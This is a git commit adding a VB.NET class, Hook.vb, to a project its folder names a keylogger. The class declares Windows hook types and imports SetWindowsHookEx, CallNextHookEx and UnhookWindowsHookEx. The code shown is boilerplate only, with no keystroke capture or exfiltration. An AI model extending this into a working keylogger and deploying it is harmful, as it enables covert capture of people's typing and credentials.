2298a25ed6852ad82d00ac2336275f2760d04b66
John Apostolou <loveyou@brainsoft.gr>
2014-04-16 01:43:25 +0300

    Signed-off-by: John Apostolou <loveyou@brainsoft.gr>

---
+++ VB.Net keylogger/Hook.vb
@@ -0,0 +1,39 @@
+﻿Imports System.Runtime.InteropServices
+Public Class Hook
+    Enum HookType As Integer
+        WH_JOURNALRECORD = 0
+        WH_JOURNALPLAYBACK = 1
+        WH_KEYBOARD = 2
+        WH_GETMESSAGE = 3
+        WH_CALLWNDPROC = 4
+        WH_CBT = 5
+        WH_SYSMSGFILTER = 6
+        WH_MOUSE = 7
+        WH_HARDWARE = 8
+        WH_DEBUG = 9
+        WH_SHELL = 10
+        WH_FOREGROUNDIDLE = 11
+        WH_CALLWNDPROCRET = 12
+        WH_KEYBOARD_LL = 13
+        WH_MOUSE_LL = 14
+    End Enum
+
+    'Import for the SetWindowsHookEx function.
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    Private Overloads Shared Function SetWindowsHookEx _
+          (ByVal HookType As HookType, ByVal HookProc As CallBack, _
+           ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
+    End Function
+
+    'Import for the CallNextHookEx function.
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    Private Overloads Shared Function CallNextHookEx _
+          (ByVal idHook As Integer, ByVal nCode As Integer, _
+           ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
+    End Function
+    'Import for the UnhookWindowsHookEx function.
+    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
+    Private Overloads Shared Function UnhookWindowsHookEx _
+              (ByVal idHook As Integer) As Boolean
+    End Function
+End Class
